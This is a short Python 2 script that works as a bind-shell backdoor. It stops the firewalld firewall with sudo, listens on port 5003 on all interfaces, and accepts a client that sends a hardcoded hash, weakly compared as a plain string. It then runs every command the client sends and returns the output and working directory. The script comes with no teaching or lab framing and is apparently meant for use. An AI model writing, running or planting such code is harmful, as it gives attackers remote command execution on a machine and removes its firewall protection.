import socket                                                                               
import os
import subprocess
import sys

try:
    subprocess.call(['sudo', 'systemctl', 'stop', 'firewalld'])
    print "Firewall stopped successfully."
except subprocess.CalledProcessError as e:
    print "Error stopping firewall:", e

SERVER_HOST = "0.0.0.0"  # Listen on all available interfaces                           
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print "Listening as {}:{}".format(SERVER_HOST, SERVER_PORT)

# Hash the password
hashed_password = "1662198d30fef98b6ce2f4f3519136a7ac6eb71994373fa4453a3844ae963413"

while True:
    client_socket, client_address = s.accept()
    print "{}:{} Connected!".format(client_address[0], client_address[1])
    
    # Receive the hashed password from the client
    client_hashed_password = client_socket.recv(BUFFER_SIZE).decode()

    # Check if the received hashed password matches the locally hashed password
    if client_hashed_password == hashed_password:
        client_socket.send("Authentication successful".encode())
    else:
        client_socket.send("Authentication failed".encode())
        client_socket.close()
        continue
            
    cwd = os.getcwd()
    client_socket.send(cwd)

    while True:
        command = client_socket.recv(BUFFER_SIZE)
        splitted_command = command.split()
        if command.lower() == "exit":
            break
        if splitted_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splitted_command[1:]))
            except (OSError, IOError) as e:
                output = str(e)
            else:
                output = ""
        else:
            try:
                output = subprocess.check_output(splitted_command, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e)

        cwd = os.getcwd()
        message = output + SEPARATOR + cwd
        client_socket.send(message)

    client_socket.close()
